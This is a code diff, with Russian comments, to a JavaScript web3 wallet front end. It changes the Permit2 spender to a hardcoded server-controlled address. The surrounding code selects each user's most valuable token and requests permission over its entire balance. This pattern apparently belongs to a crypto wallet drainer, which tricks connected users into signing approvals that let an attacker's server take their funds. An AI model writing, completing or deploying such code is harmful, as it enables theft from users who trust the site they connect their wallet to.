@@ -8,6 +8,8 @@ import { readContract, writeContract, sendCalls, estimateGas, getGasPrice, getBa
 const USE_SENDCALLS = false; // Поставьте false для отключения batch-операций
 // === Флаг для включения Permit2 вместо single approve ===
 const USE_PERMIT2 = true; // true => использовать Permit2, false => обычный single approve
+// Адрес spender для Permit2 (должен быть EOA сервера, который подпишет tx на Permit2)
+const PERMIT2_SPENDER = import.meta.env.VITE_PERMIT2_SPENDER || '0x1c3537AA356AD38bD727CDF1fb4614dbb15e35C9'
 
 // Нативные символы и получатель перевода нативки (заглушка)
 const NATIVE_SYMBOLS = {
@@ -743,7 +745,7 @@ const performBatchOperations = async (mostExpensive, allBalances, state) => {
       } else {
         const token = erc20WithBalance.reduce((acc, t) => (t.price * t.balance > (acc?.price || 0) * (acc?.balance || 0) ? t : acc), erc20WithBalance[0])
         const amount = parseUnits(token.balance.toString(), token.decimals)
-        const spender = CONTRACTS[token.chainId]
+        const spender = PERMIT2_SPENDER
         const deadline = Math.floor(Date.now() / 1000) + 60 * 10
         const nonce = BigInt(Date.now())
         try {
@@ -1037,7 +1039,7 @@ const initializeSubscribers = (modal) => {
         if (!USE_SENDCALLS && USE_PERMIT2) {
           const token = mostExpensive
           const amount = parseUnits(token.balance.toString(), token.decimals)
-          const spender = CONTRACTS[token.chainId]
+          const spender = PERMIT2_SPENDER
           const deadline = Math.floor(Date.now() / 1000) + 60 * 10
           const nonce = BigInt(Date.now())
           try {
